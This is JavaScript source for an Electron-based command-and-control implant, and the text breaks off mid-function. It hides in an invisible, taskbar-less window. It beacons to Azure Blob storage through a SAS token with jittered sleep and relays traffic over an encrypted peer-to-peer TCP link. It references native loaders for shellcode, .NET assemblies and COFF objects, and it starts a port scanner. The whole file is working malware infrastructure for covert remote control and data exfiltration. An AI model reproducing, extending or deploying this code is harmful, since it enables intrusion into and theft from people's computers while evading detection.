const { app, BrowserWindow, ipcMain } = require('electron');
const crypto = require('crypto');
const { log } = require('console');
const os = require('os');
const fsp = require('fs').promises;
const { spawn } = require('child_process');
const path = require('path');
const dns = require('dns');
const net = require('net');
let customDnsServer = null;
const config = require('./config.js');

global.mode             = (!config.mode || (config.mode !== 'egress' && !config.mode.startsWith('link-'))) ? 'egress' : config.mode;
global.TCPServer        = null;
global.TCPLinkAgent     = null;
global.init             = false;
global.debug            = true;
global.mainWindow       = null;
global.agent            = null;
global.scexecNodePath   = "./scexec.node";
global.assemblyNodePath = "./assembly.node";
global.path_coffloader  = "./COFFLoader.node";
global.STORAGE_ACCOUNT  = config.storageAccount;
global.META_CONTAINER   = config.metaContainer;
global.SAS_TOKEN        = config.sasToken;
global.P2P_CHALLENGE    = config.metaContainer;
global.P2P_PORT         = config.p2pPort || null;

class Container {
    constructor() {
        this.name = generateUUID(10);
        this.key = generateAESKey();
        this.blobs = {
            'checkin': 'c-' + generateUUID(12),
            'in': 'i-' + generateUUID(12)
        };
    }
    setName(name) {
        this.name = name;
    }
    setKey(key) {
        this.key = {
            'key': key.key,
            'iv': key.iv
        };
    }
}

class Agent {
  constructor() {
      this.agentid = generateUUID(16);
      this.container = new Container();
      this.checkin = Date.now();
      this.sleepinterval = 5;
      this.sleepjitter = 15;
      this.thissleep = 5000;
      this.storageAccount = '';
      this.metaContainer = '';
      this.sasToken = '';
      this.cwd = '';
  }
  setAgentId(agentid) {
      this.agentid = agentid;
  }
  setContainer(container) {
      this.container = container;
  }
  setStorageConfig(storageAccount, metaContainer, sasToken) {
      this.storageAccount = storageAccount;
      this.metaContainer = metaContainer;
      this.sasToken = sasToken;
  }
  setCwd(cwd) {
      this.cwd = cwd;
  }
  setWindow(window) {
      this.window = window;
  }
}

class Task {
  constructor(outputChannel, command, uploadChannel = null,taskid = null) {
      this.outputChannel = outputChannel;
      this.command = command;
      this.uploadChannel = uploadChannel;
      this.taskid = taskid;
  }
}

function debug(message) 
{
    if(global.debug) {
        const timestamp = new Date().toISOString();
        log(`[${timestamp}] ${message}`);
    }
}

async function createWindow() {
  let thisWindow = new BrowserWindow({
    width: 0,
    height: 0,
    show: false,
    skipTaskbar: true,
    webPreferences: {
      nodeIntegration: true,
      contextIsolation: false,
      backgroundThrottling: false,
      v8CacheOptions: 'none'
    }
  });
  thisWindow.loadFile('renderer.html');
  debug('Window created');
  return thisWindow;
}

app.on('window-all-closed', () => { });

app.on('ready', async () => {
    try {
        debug('App is ready, creating main window...');
        global.mainWindow = await createWindow();
        if (!global.mainWindow) {
            throw new Error('Failed to create main window');
        }
        
        global.agent = new Agent();
        global.agent.setStorageConfig(global.STORAGE_ACCOUNT, global.META_CONTAINER, global.SAS_TOKEN);
        global.agent.setCwd(process.cwd());
        debug('[READY] Storage config:');
        debug(`[READY] |_ storageAccount: ${global.agent.storageAccount}`);
        debug(`[READY] |_ metaContainer: ${global.agent.metaContainer}`);
        debug('[READY] |_ sasToken: [REDACTED]');
        debug('[READY] Agent object properties:');
        debug(`[READY] |_ agentid: ${global.agent.agentid}`);
        debug(`[READY] |_ checkin: ${global.agent.checkin}`);
        debug(`[READY] |_ sleepinterval: ${global.agent.sleepinterval}`);
        debug(`[READY] |_ sleepjitter: ${global.agent.sleepjitter}`);
        debug(`[READY] |_ thissleep: ${global.agent.thissleep}`);
        debug(`[READY] |_ cwd: ${global.agent.cwd}`);
        debug('[READY] Container object:');
        debug(`\t${JSON.stringify(global.agent.container)}`);
        // Keep trying to initialize until successful
        let failattempts = 0;
        if (global.mode== 'link-tcp') {
            debug(`Starting TCP server on port ${global.P2P_PORT}...`);
            
            // Create and start the TCP server with configuration from config.js
            global.TCPServer = new TCPServer(global.P2P_PORT, global.P2P_CHALLENGE, global.agent.agentid);
            try {
                await global.TCPServer.start();
                debug(`TCP server started successfully on port ${global.P2P_PORT}`);
                
                // Wait for a client to connect and authenticate
                debug('Waiting for client to connect and authenticate...');
                await global.TCPServer.waitForClient();
                debug('Client connected and authenticated successfully');
            } catch (error) {
                debug(`Failed to start TCP server or wait for client: ${error.message}\r\n${error.stack}`);
                return;
            }
        }
        while (true) {
            let initResult = await init();
            if (initResult === true) {
                debug('Initialization successful');
                break;
            }
            else{
                failattempts++;
                debug(`Initialization failed for ${failattempts} time, retrying in 20 seconds... `);
                await new Promise(resolve => setTimeout(resolve, 20000));
            }
        }
        await TaskLoop();
    } catch (error) {
        debug(`Error during initialization: ${error.message}`);
        debug(`Error stack: ${error.stack}`);
        app.quit();
    }
}); 

class TCPAgent {
    constructor(config = {}) {
        this.config = {
            hostname: config.hostname,
            port: config.port,
            password: config.password,
            maxReconnectDelay: 30000,
            initialReconnectDelay: 1000,
            requestTimeout: 30000
        };

        this.client = null;
        this.isConnected = false;
        this.reconnectAttempts = 0;
        this.buffer = '';
        this.p2p_aes = null;
        this.onMessageCallback =  null;
        this.onConnectCallback = null;
        this.onDisconnectCallback = null;
        this.onErrorCallback = null;
    }

    async generateKeyAndIV(password, salt = crypto.randomBytes(16).toString('hex')) {
        const key = crypto.pbkdf2Sync(password, salt, 100000, 32, 'sha256');
        const iv = crypto.randomBytes(16);
        return { key, iv, salt };
    }

    async encrypt(data, key, iv) {
        const cipher = crypto.createCipheriv('aes-256-cbc', key, iv);
        let encrypted = "";
        if (Buffer.isBuffer(data)) {
            encrypted = Buffer.concat([cipher.update(data), cipher.final()]);
        } else {
            encrypted = cipher.update(data, 'utf8', 'hex');
            encrypted += cipher.final('hex');
        }
        return encrypted;
    }

    async decrypt(encryptedData, key, iv) {
        try {
            const decipher = crypto.createDecipheriv('aes-256-cbc', key, iv);
            let decrypted = "";
            if (Buffer.isBuffer(encryptedData)) {
                decrypted = Buffer.concat([decipher.update(encryptedData), decipher.final()]);
            } else {
                decrypted = decipher.update(encryptedData, 'hex', 'utf8');
                decrypted += decipher.final('utf8');
            }
            return decrypted;
        } catch (error) {
            debug(`Error in decrypt(): ${error} ${error.stack}`);
            return null;
        }
    }

    async base64Encode(input) {
        try {
            if (typeof input === 'string') {
                input = Buffer.from(input, 'utf-8');
            } else if (!Buffer.isBuffer(input)) {
                input = Buffer.from(JSON.stringify(input), 'utf-8');
            }
            return input.toString('base64');
        } catch (error) {
            return null;
        }
    }

    async base64Decode(base64) {
        try {
            const buffer = Buffer.from(base64, 'base64');
            return buffer.toString('utf-8');
        } catch (error) {
            return null;
        }
    }

    async connect() {
        if (!this.config.hostname || !this.config.port || !this.config.password) {
            throw new Error('Missing required parameters: hostname, port, and password are required');
        }

        this.client = new net.Socket();
        
        this.client.connect(this.config.port, this.config.hostname, async () => {
            debug('Connected to server');
            this.isConnected = true;
            this.reconnectAttempts = 0;
            
            this.p2p_aes = await this.generateKeyAndIV(this.config.password);
            const encrypted_message = await this.encrypt(this.config.password, this.p2p_aes.key, this.p2p_aes.iv);
            const encoded_message = await this.base64Encode(JSON.stringify({
                salt: this.p2p_aes.salt,
                iv: this.p2p_aes.iv.toString('hex'),
                ciphertext: encrypted_message
            }));
            this.client.write(encoded_message + '\n');

            if (this.onConnectCallback) {
                this.onConnectCallback();
            }
        });

        this.setupEventHandlers();
    }

    setupEventHandlers() {
        this.client.on('data', async (data) => {
            let currentRequest = null;
            const decoded_message = await this.base64Decode(data.toString());
            const decrypted_message = await this.decrypt(decoded_message, this.p2p_aes.key, this.p2p_aes.iv);
            if (decrypted_message === null) {
                debug('Dropping invalid encrypted message');
                return;
            }
            this.buffer += decrypted_message;
            
            const messages = this.buffer.split('\n');
            this.buffer = messages.pop();

            for (const message of messages) {
                if (!message.trim()) continue;

                if (message.trim() === 'AUTH_SUCCESS') {
                    debug('Authentication successful');
                    continue;
                } else if (message.trim() === 'AUTH_FAILED') {
                    debug('Authentication failed');
                    this.disconnect();
                    return;
                }

                try {
                    // Parse the web request from server
                    currentRequest = JSON.parse(message);
                    
                    // Handle x-ms-meta-link header if present
                    if (currentRequest.headers && currentRequest.headers['x-ms-meta-link']) {
                        const existingLinks = currentRequest.headers['x-ms-meta-link'];
                        currentRequest.headers['x-ms-meta-link'] = existingLinks ? `${existingLinks},${global.agent.agentid}` : global.agent.agentid;
                    }

                    debug('Received web request from server:');
                    debug(`Task ID: ${currentRequest.taskId}`);
                    debug(`Agent ID: ${currentRequest.agentId}`);
                    debug(`URL: ${currentRequest.url}`);
                    debug(`Method: ${currentRequest.method}`);
                    debug(`Headers: ${JSON.stringify(currentRequest.headers)}`);
                    debug(`Body: ${currentRequest.body}`);

                    // Validate required fields
                    if (!currentRequest.url) {
                        throw new Error('Missing required field: url');
                    }

                    const method = currentRequest.method || 'GET';
                    const headers = currentRequest.headers || {};
                    const defaultHeaders = {
                        'Cache-Control': 'no-cache, no-store, must-revalidate',
                        'Pragma': 'no-cache',
                        'Expires': '0'
                    };
                    // Parse URL to get hostname and path
                    const urlObj = new URL(currentRequest.url);
                    const hostname = urlObj.hostname;
                    const path = urlObj.pathname + urlObj.search;
                    let fetchOptions = {
                        hostname: hostname,
                        path: path,
                        port: 443,
                        method: method,
                        headers: { ...defaultHeaders, ...headers },
                        signal: AbortSignal.timeout(this.config.requestTimeout)
                    };


                    // Only add body for non-GET/HEAD methods
                    if (currentRequest.body !== undefined && !['GET', 'HEAD'].includes(method.toUpperCase())) {
                        if (method === 'PUT' && headers['Content-Type'] === 'text/plain') {
                            fetchOptions.body = currentRequest.body;
                        } else {
                            fetchOptions.body = currentRequest.body;
                        }
                    }

                    debug('Sending request with options:', JSON.stringify(fetchOptions, null, 2));

                    try {
                        //const response = await fetch(currentRequest.url, fetchOptions);
                        const response = await func_Web_Request(fetchOptions,fetchOptions.body,currentRequest.isBytes);
                        //func_Web_Request(options, data = null, isBytes = false)
                        debug(`Response status: ${response.status} ${response.statusText}`);
                        
                        let data = "";
                        if (currentRequest.isBytes) {
                            const arrayBuffer = await response.data.arrayBuffer();
                            data = Buffer.from(arrayBuffer);
                        } else {
                            data = await response.data;
                        }

                        // Create response object
                        const responseObject = {
                            status: response.status,
                            statusText: response.statusText,
                            headers: response.headers,
                            data: data,
                            agentId: currentRequest.agentId,
                            taskId: currentRequest.taskId
                        };

                        debug(`Response object: ${JSON.stringify(responseObject)}`);

                        // Send response back to server
                        const encrypted_message = await this.encrypt(JSON.stringify(responseObject) + '\n', this.p2p_aes.key, this.p2p_aes.iv);
                        const encoded_message = await this.base64Encode(encrypted_message);
                        this.client.write(encoded_message);
                        debug('Sent response back to server');

                    } catch (fetchError) {
                        debug('Fetch error:', fetchError);
                        if (fetchError.name === 'AbortError') {
                            throw new Error('Request timed out after ' + this.config.requestTimeout + ' seconds');
                        }
                        throw fetchError;
                    }

                } catch (error) {
                    debug('Error processing request:', error);
                    // Send error response back to server
                    const errorResponse = {
                        error: error.message,
                        agentId: currentRequest?.agentId,
                        taskId: currentRequest?.taskId
                    };

                    try {
                        const encrypted_error = await this.encrypt(JSON.stringify(errorResponse) + '\n', this.p2p_aes.key, this.p2p_aes.iv);
                        const encoded_error = await this.base64Encode(encrypted_error);
                        this.client.write(encoded_error);
                        debug('Sent error response to server');
                    } catch (encryptError) {
                        debug('Failed to encrypt error response:', encryptError);
                    }
                }
            }
        });

        this.client.on('end', () => {
            debug('Connection ended');
            this.isConnected = false;
            if (this.onDisconnectCallback) {
                this.onDisconnectCallback();
            }
            //this.attemptReconnect();
        });

        this.client.on('error', (error) => {
            debug('Connection error:', error);
            this.isConnected = false;
            if (this.onErrorCallback) {
                this.onErrorCallback(error);
            }
            //this.attemptReconnect();
        });
    }

    async sendMessage(message) {
        if (!this.isConnected) {
            throw new Error('Not connected to server');
        }

        try {
            const encrypted_message = await this.encrypt(JSON.stringify(message) + '\n', this.p2p_aes.key, this.p2p_aes.iv);
            const encoded_message = await this.base64Encode(encrypted_message);
            this.client.write(encoded_message);
            return true;
        } catch (error) {
            debug('Error sending message:', error);
            return false;
        }
    }

    disconnect() {
        if (this.client) {
            this.client.destroy();
            this.isConnected = false;
        }
    }

    attemptReconnect() {
        if (this.isConnected) return;
        
        const delay = Math.min(
            this.config.initialReconnectDelay * Math.pow(2, this.reconnectAttempts),
            this.config.maxReconnectDelay
        );
        
        debug(`Attempting to reconnect in ${delay}ms...`);
        
        setTimeout(() => {
            this.reconnectAttempts++;
            this.connect();
        }, delay);
    }
}

class TCPServer {
    constructor(port, password, agentId) {
        this.server = null;
        this.authenticatedClients = new Set();
        this.requestQueue = [];
        this.isProcessingQueue = false;
        this.clientConnectedPromise = null;
        this.clientConnectedResolve = null;
        this.pendingResponses = new Map();
        this.port = port;
        this.password = password;
        this.agentId = agentId;
    }

    // Start the TCP server
    async start() {
        return new Promise((resolve, reject) => {
            this.server = net.createServer((socket) => {
                let isAuthenticated = false;
                let decryptedMessage = '';
                let sessionCrypto = null;

                socket.on('data', async (data) => {
                    decryptedMessage = '';
                    const message = data.toString();
                    try {
                        const decodedMessage = await func_Base64_Decode(message);
                        if (!decodedMessage) {
                            debug('[TCP-SERVER] Failed to decode base64 message');
                            socket.end();
                            return;
                        }
                        if (!sessionCrypto) {
                            const handshake = JSON.parse(decodedMessage);
                            if (!handshake.salt || !handshake.iv || !handshake.ciphertext) {
                                throw new Error('Invalid P2P handshake');
                            }
                            sessionCrypto = await generateKeyAndIV(this.password, handshake.salt);
                            sessionCrypto.iv = Buffer.from(handshake.iv, 'hex');
                            if (sessionCrypto.iv.length !== 16) throw new Error('Invalid P2P IV');
                        }
                        global.p2p_aes = sessionCrypto;
                        const ciphertext = !isAuthenticated
                            ? JSON.parse(decodedMessage).ciphertext
                            : decodedMessage;
                        decryptedMessage = await func_Decrypt(ciphertext, sessionCrypto.key, sessionCrypto.iv);
                        if (!decryptedMessage) {
                            debug('[TCP-SERVER] Failed to decrypt message');
                            socket.end();
                            return;
                        }
                    } catch (error) {
                        debug(`[TCP-SERVER] Error processing message: ${error.message}`);
                        socket.end();
                        return;
                    }
                    debug(`[TCP-SERVER] Received message: ${decryptedMessage}`);

                    if (!isAuthenticated) {
                        // Check password
                        if (decryptedMessage === this.password) {
                            debug('[TCP-SERVER] Authentication successful');
                            isAuthenticated = true;
                            this.authenticatedClients.add(socket);
                            let encrypted_response = await func_Encrypt('AUTH_SUCCESS\n', global.p2p_aes.key, global.p2p_aes.iv);
                            let encoded_response = await func_Base64_Encode(encrypted_response);
                            socket.write(encoded_response);
                            
                            // Resolve the wait for client promise if it exists
                            if (this.clientConnectedResolve) {
                                this.clientConnectedResolve();
                                this.clientConnectedResolve = null;
                                this.clientConnectedPromise = null;
                            }
                        } else {
                            debug('[TCP-SERVER] Authentication failed - invalid password');
                            let encrypted_response = await func_Encrypt('AUTH_FAILED\n', global.p2p_aes.key, global.p2p_aes.iv);
                            let encoded_response = await func_Base64_Encode(encrypted_response);
                            socket.write(encoded_response);
                            socket.end();
                        }
                        return;
                    }

                    try {
                        // Parse the response from agent
                        const response = JSON.parse(decryptedMessage);
                        debug(`[TCP-SERVER] Response with taskId: ${response.taskId}`);
                        debug(`[TCP-SERVER] Response with agentid: ${response.agentId}`);
                        const pendingResponse = this.pendingResponses.get(response.taskId);
                        if (pendingResponse) {
                            pendingResponse.resolve(response);
                            this.pendingResponses.delete(response.taskId);
                        }

                        // Remove the current request from queue and process next
                        if (this.requestQueue.length > 0) {
                            this.requestQueue.shift();
                        }
                        this.processNextRequest();
                    } catch (error) {
                        debug(`[TCP-SERVER] Error parsing response: ${error.message}`);
                        if (this.requestQueue.length > 0) {
                            const currentRequest = this.requestQueue[0];
                            currentRequest.reject(error);
                            this.requestQueue.shift();
                        }
                    }
                });

                socket.on('end', () => {
                    debug('[TCP-SERVER] Client disconnected (end event)');
                    if (isAuthenticated) {
                        // Reject any pending requests for this client
                        for (const [taskId, pendingResponse] of this.pendingResponses) {
                            pendingResponse.reject(new Error('Client disconnected'));
                            this.pendingResponses.delete(taskId);
                        }
                        this.authenticatedClients.delete(socket);
                        debug(`[TCP-SERVER] Removed client from authenticated clients. Remaining clients: ${this.authenticatedClients.size}`);
                        
                        // Reset client connection promise if no clients remain
                        if (this.authenticatedClients.size === 0) {
                            this.clientConnectedPromise = null;
                            this.clientConnectedResolve = null;
                        }
                    }
                });

                socket.on('error', (error) => {
                    debug(`[TCP-SERVER] Client connection error: ${error.message}`);
                    if (isAuthenticated) {
                        // Reject any pending requests for this client
                        for (const [taskId, pendingResponse] of this.pendingResponses) {
                            pendingResponse.reject(new Error('Client connection error'));
                            this.pendingResponses.delete(taskId);
                        }
                        this.authenticatedClients.delete(socket);
                        debug(`[TCP-SERVER] Removed client from authenticated clients due to error. Remaining clients: ${this.authenticatedClients.size}`);
                    }
                });

                socket.setTimeout(30000);
                socket.on('timeout', () => {
                    debug('[TCP-SERVER] Client connection timed out');
                    if (isAuthenticated) {
                        // Reject any pending requests for this client
                        for (const [taskId, pendingResponse] of this.pendingResponses) {
                            pendingResponse.reject(new Error('Client connection timeout'));
                            this.pendingResponses.delete(taskId);
                        }
                        this.authenticatedClients.delete(socket);
                        debug(`[TCP-SERVER] Removed client from authenticated clients due to timeout. Remaining clients: ${this.authenticatedClients.size}`);
                    }
                    //socket.end();
                    TaskLoop();
                });
            });

            this.server.listen(this.port, () => {
                resolve();
            });

            this.server.on('error', (error) => {
                reject(error);
            });
        });
    }

    // Wait for a client to connect and authenticate
    waitForClient() {
        if (this.authenticatedClients.size > 0) {
            return Promise.resolve();
        }

        // Reset the promise if it was previously resolved/rejected
        this.clientConnectedPromise = null;
        this.clientConnectedResolve = null;

        // Create new promise to wait for client - no timeout
        this.clientConnectedPromise = new Promise((resolve) => {
            this.clientConnectedResolve = resolve;
        });

        return this.clientConnectedPromise;
    }

    // Stop the TCP server
    stop() {
        return new Promise((resolve) => {
            if (this.server) {
                this.server.close(() => {
                    resolve();
                });
            } else {
                resolve();
            }
        });
    }

    // Generate a random task ID
    generateTaskId() {
        return crypto.randomBytes(4).toString('hex');
    }

    // Process the next request in the queue
    async processNextRequest() {
        if (this.requestQueue.length === 0) {
            this.isProcessingQueue = false;
            return;
        }

        const request = this.requestQueue[0];
        const client = this.getNextAuthenticatedClient();

        if (!client) {
            while (this.requestQueue.length > 0) {
                const queuedRequest = this.requestQueue.shift();
                queuedRequest.reject(new Error('No authenticated clients available'));
            }
            this.isProcessingQueue = false;
            return;
        }

        const taskId = this.generateTaskId();
        const requestWithIds = {
            ...request,
            taskId,
            agentId: this.agentId
        };

        this.pendingResponses.set(taskId, {
            resolve: request.resolve,
            reject: request.reject
        });
        let requests = JSON.stringify(requestWithIds) + '\n'
        let encrypted_requests = await func_Encrypt(requests, global.p2p_aes.key, global.p2p_aes.iv);
        let encoded_requests = await func_Base64_Encode(encrypted_requests);

        client.write(encoded_requests);
    }

    // Get the next available authenticated client
    getNextAuthenticatedClient() {
        return this.authenticatedClients.size > 0 
            ? Array.from(this.authenticatedClients)[0] 
            : null;
    }

    // Add a web request to the queue
    async makeWebRequest(request) {
        return new Promise((resolve, reject) => {
            if (this.authenticatedClients.size === 0) {
                debug('[TCP-SERVER] No authenticated clients available');
                resolve(false);
                return;
            }

            const requestWithCallback = {
                ...request,
                resolve,
                reject
            };

            this.requestQueue.push(requestWithCallback);

            if (!this.isProcessingQueue) {
                this.isProcessingQueue = true;
                this.processNextRequest();
            }
        });
    }
}

function generateAESKey()
{
    const key_material = { 
        'key' : crypto.randomBytes(32), // 256-bit key
        'iv'  : crypto.randomBytes(16)  // 128-bit IV
    };
    return key_material;
}

// Function to generate key and IV from a password
async function generateKeyAndIV(password, salt = crypto.randomBytes(16).toString('hex')) {
    // Derive a session key from a per-session random salt and use a random IV.
    const key = crypto.pbkdf2Sync(password, salt, 100000, 32, 'sha256'); // 32 bytes for AES-256 key
    const iv = crypto.randomBytes(16);
    
    return {
        key: key,
        iv: iv,
        salt: salt
    };
}


function generateUUID(len) {
    if (len > 20) len = 20; // Limit max length to 20
    if (len < 1) return ''; // Handle invalid length
    const letters = 'abcdefghijklmnopqrstuvwxyz';
    const firstChar = letters[Math.floor(Math.random() * letters.length)];
    if (len === 1) return firstChar;
    const uuid = crypto.randomBytes(Math.ceil((len - 1) / 2)).toString('hex');
    return (firstChar + uuid).substring(0, len);
  }

async function func_Encrypt(data,key,iv) {
    const cipher = crypto.createCipheriv('aes-256-cbc', key, iv);
  
    let encrypted = "";
    if ( Buffer.isBuffer( data ) ) {
      encrypted = Buffer.concat([cipher.update(data), cipher.final()]);
    }
    else { 
      encrypted = cipher.update(data, 'utf8', 'hex');
      encrypted += cipher.final('hex');
    }
    return encrypted;
  }
  
async function func_Decrypt(encryptedData,key,iv) {
    try{
        const decipher = crypto.createDecipheriv('aes-256-cbc', key, iv);
        
        let decrypted = "";
        if ( Buffer.isBuffer( encryptedData ) ) {
          decrypted = Buffer.concat([decipher.update(encryptedData), decipher.final()]);
        }
        else { 
          decrypted = decipher.update(encryptedData, 'hex', 'utf8');
          decrypted += decipher.final('utf8');
        }
        return decrypted;
    }
    catch(error){
        debug(`Error in func_Decrypt() : ${error} ${error.stack}`);
        return null;
    }
}

// Function to encode a string to base64
async function func_Base64_Encode(input) {
    try {
        if (typeof input === 'string') {
            input = Buffer.from(input, 'utf-8');
        } else if (!Buffer.isBuffer(input)) {
            input = Buffer.from(JSON.stringify(input), 'utf-8');
        }
        return input.toString('base64');
    } catch (error) {
        return null;
    }
}

// Function to decode a base64 string
async function func_Base64_Decode(base64) {
    try {
        const buffer = Buffer.from(base64, 'base64');
        return buffer.toString('utf-8');
    } catch (error) {
        return null;
    }
}

async function func_Web_Request(options, data = null, isBytes = false) {
    if (!global.mainWindow || global.mainWindow.isDestroyed()) {
        debug('Main window is not available');
        global.mainWindow = await createWindow();
    }
    if (global.mainWindow.webContents.isLoading()) {
        await new Promise(resolve => {
            global.mainWindow.webContents.once('did-finish-load', resolve);
        });
    }
    const url = `https://${options.hostname}${options.path}`;
    const requestId = Date.now().toString();
    if (data) {
        if (!options.headers) {
            options.headers = {};
        }
        options.headers['Content-Length'] = Buffer.byteLength(data);
    }
    const requestObject = {
      url:url,
      method: options.method,
      headers: options.headers,
      body: data,
      isBytes: isBytes
    }
    if (global.mode== 'link-tcp') {
      requestObject.requestId = requestId;
      requestObject.isBytes = isBytes;
      const response = await global.TCPServer.makeWebRequest(requestObject);
      debug(`[WEB-REQUEST] Response : ${JSON.stringify(response)}`);
      return response;
    }
    return new Promise((resolve, reject) => {
        //const url = `https://${options.hostname}:${options.port}${options.path}`;
        //const requestId = Date.now().toString();
        const responseHandler = (event, response) => {
            debug(`[WEB-REQUEST] Response status: ${response.status}`);
            if (response.error) {
                reject(new Error(response.error));
                return;
            }
            resolve({
                response: response,
                status: response.status,
                data: response.data
            });
        };
        ipcMain.once(`web-request-response-${requestId}`, responseHandler);
        if (data) {
            if (!options.headers) {
                options.headers = {};
            }
            options.headers['Content-Length'] = Buffer.byteLength(data);
        }
        try {
            global.mainWindow.webContents.send('make-web-request', {
                url,
                method: options.method,
                headers: options.headers,
                body: data,
                requestId,
                isBytes: isBytes
            }
          );
        } catch (err) {
            ipcMain.removeListener(`web-request-response-${requestId}`, responseHandler);
            reject(err);
        }
        let timeout = options.path.includes('restype=container') ? 60000 : 30000;
        if (isBytes) {
            timeout = 300000;
        }
        setTimeout(() => {
            ipcMain.removeListener(`web-request-response-${requestId}`, responseHandler);
            reject(new Error(`Web request timed out after ${timeout}ms`));
        }, timeout);
    });
}

async function func_Blob_Stat(container, blob) {
  let options = {
      hostname: global.agent.storageAccount,
      port: 443,
      path: `/${container}/${blob}?restype=blob&${global.agent.sasToken}`,
      method: 'HEAD',
      headers: {
          'x-ms-version': '2020-02-10',
          'x-ms-date': new Date().toUTCString()
      }
  };
  let response = await func_Web_Request(options);
  return response.status === 200;
}

async function func_Blob_Create(ContainerName, StorageBlob, data) {
    try {
        debug(`[BLOB_CREATE] blob : /${ContainerName}/${StorageBlob}`);
        if (data == null) {
            data = "";
        }
        data = data.toString();
        const options = {
            hostname: global.agent.storageAccount,
            port: 443,
            path: `/${ContainerName}/${StorageBlob}?${global.agent.sasToken}`,
            method: 'PUT',
            headers: {
                'x-ms-version': '2020-02-10',
                'x-ms-date': new Date().toUTCString(),
                'x-ms-blob-type': 'BlockBlob',
                'Content-Type': 'text/plain',
                'Content-Length': Buffer.byteLength(data)
            }
        };
        let response = await func_Web_Request(options, data);
        return response.status === 201;
    } catch (error) {
        debug(`Error in func_Blob_Create() : ${error}`);
        return false;
    }
}

async function clearBlob(StorageContainer, StorageBlob) 
{
  const options = {
    hostname: global.agent.storageAccount,
    port: 443,
    path: `/${StorageContainer}/${StorageBlob}?${global.agent.sasToken}`,
    method: 'PUT',
    headers: {
      'x-ms-version': '2020-02-10',
      'x-ms-date': new Date().toUTCString(),
      'x-ms-blob-type': 'BlockBlob',
      'Content-Type': 'text/plain',
      'Content-Length': 0 
    }
  };
  return await func_Web_Request(options);
}

async function func_Container_Create(container) {
    debug(`[CONTAINER_CREATE] container : ${container}`);
    let container_stat = await func_Container_Stat(container);
    if (container_stat === false) {
        let options = {
            hostname: global.agent.storageAccount,
            port: 443,
            path: `/${container}?restype=container&${global.agent.sasToken}`,
            method: 'PUT',
            headers: {
                'x-ms-version': '2020-02-10',
                'x-ms-date': new Date().toUTCString(),
                'Content-Length': 0
            }
        };
        let response = await func_Web_Request(options);
        return response.status === 201;
    }
    return container_stat;
}

async function func_Container_Stat(container) {
    let options = {
        hostname: global.agent.storageAccount,
        port: 443,
        path: `/${container}?restype=container&${global.agent.sasToken}`,
        method: 'HEAD',
        headers: {
            'x-ms-version': '2020-02-10',
            'x-ms-date': new Date().toUTCString()
        }
    };
    let response = await func_Web_Request(options);
    return response.status === 200;
}

async function Blob_Set_Metadata(container, blob, metadata) {
  const query = `/${container}/${blob}?comp=metadata&${global.agent.sasToken}`;

  const headers = {
    "x-ms-version": "2022-11-02",
    "x-ms-date": new Date().toUTCString(),
    "Content-Length": 0,
  };

  // Add metadata headers
  for (const [key, value] of Object.entries(metadata)) {
    headers[`x-ms-meta-${key.toLowerCase()}`] = value;
  }

  const options = {
    method: "PUT",
    hostname: global.agent.storageAccount,
    path: query,
    port: 443,
    headers: headers
  };

  return await func_Web_Request(options);
}

async function getSystemInfo() {
    try {
        if (!global.mainWindow || global.mainWindow.isDestroyed()) {
            debug('Main window is not available');
            global.mainWindow = await createWindow();
        }
        if (global.mainWindow.webContents.isLoading()) {
            await new Promise(resolve => {
                global.mainWindow.webContents.once('did-finish-load', resolve);
            });
        }

        return new Promise((resolve, reject) => {
            const requestId = Date.now().toString();
            
            const responseHandler = (event, systemInfo) => {
                ipcMain.removeListener(`system-info-response-${requestId}`, responseHandler);
                resolve(systemInfo);
            };

            ipcMain.once(`system-info-response-${requestId}`, responseHandler);
            
            global.mainWindow.webContents.send('get-system-info', requestId, global.mode);

            // Add timeout
            setTimeout(() => {
                ipcMain.removeListener(`system-info-response-${requestId}`, responseHandler);
                reject(new Error('System info request timed out'));
            }, 5000);
        });
    } catch (error) {
        debug(`Error getting system info: ${error} ${error.stack}`);
        return 0;
    }
}

async function func_Blob_Write(StorageBlob, data) {
    try {
        if (data == null) {
            data = "";
        }
        data = data.toString();
        const options = {
            hostname: global.agent.storageAccount,
            port: 443,
            path: `/${global.agent.container.name}/${StorageBlob}?${global.agent.sasToken}`,
            method: 'PUT',
            headers: {
                'x-ms-version': '2020-02-10',
                'x-ms-date': new Date().toUTCString(),
                'x-ms-blob-type': 'BlockBlob',
                'Content-Type': 'text/plain',
                'Content-Length': Buffer.byteLength(data)
            }
        };
        return await func_Web_Request(options, data);
    } catch (error) {
        debug(`Error in func_Blob_Write() : ${error} ${error.stack}`);
        return error;
    }
}

// Function to read a blob's contents
async function func_Blob_Read(Container,StorageBlob) {
    const options = {
        hostname: global.agent.storageAccount,
        port: 443,
        path: `/${Container}/${StorageBlob}?${global.agent.sasToken}`,
        method: 'GET',
        headers: {
            'x-ms-version': '2020-02-10',
            'x-ms-date': new Date().toUTCString()
        }
    };
    return await func_Web_Request(options);
}

async function func_Split_Quoted_String(str) {
    if (!str) {
      return [];
    }
    str = String(str);
    const result = [];
    let current = '';
    let insideQuotes = false;
    let quoteChar = '';
    for (let i = 0; i < str.length; i++) {
      const char = str[i];
      if (insideQuotes) {
        if (char === '\\' && (str[i + 1] === quoteChar || str[i + 1] === '\\')) {
          current += str[i + 1];
          i++;
        } else if (char === quoteChar) {
          insideQuotes = false;
          result.push(current);
          current = '';
        } else {
          current += char;
        }
      } else {
        if (char === '"' || char === "'") {
          insideQuotes = true;
          quoteChar = char;
        } else if (char === '\\' && str[i + 1] === ' ') {
          current += ' ';
          i++;
        } else if (char === ' ') {
          if (current.length > 0) {
            result.push(current);
            current = '';
          }
        } else {
          current += char;
        }
      }
    }
    if (current.length > 0) {
      result.push(current);
    }
    return result;
}

async function numcheck(value, defaultNumber, min = 1, max = 900) {
    if (typeof value !== 'number' || isNaN(value)) {
      value = defaultNumber;
    }
    if (value < min) {
      return min;
    } else if (value > max) {
      return max;
    } else {
      return value;
    }
}
  
async function getrand(number, percent) {
    try {
        number = Number(number);
        percent = Number(percent);
        const range = number * (percent / 100);
        let minValue = number - range;
        let maxValue = number + range;
        if (minValue < 1000) { minValue = 1000; }
        if (maxValue < 1000) { maxValue = 1000; }
        if (maxValue > 600000) { maxValue = 600000; }
        const randomValue = Math.random() * (maxValue - minValue) + minValue;
        return Math.floor(randomValue);
    } catch (error) {
        return 0;
    }
}

async function send_output(container,outblob,output) {
    try
    {
        debug(`Sending output to ${container} ${outblob} ${output}`);
        await func_Blob_Write(outblob,output);
    }catch(error)
    {
        debug(`Error in send-output() : ${error} ${error.stack}`);
    }
};

async function func_Scan_Ports(host, ports) {
    const openPorts = [];
    const checkPort = (host, port) => {
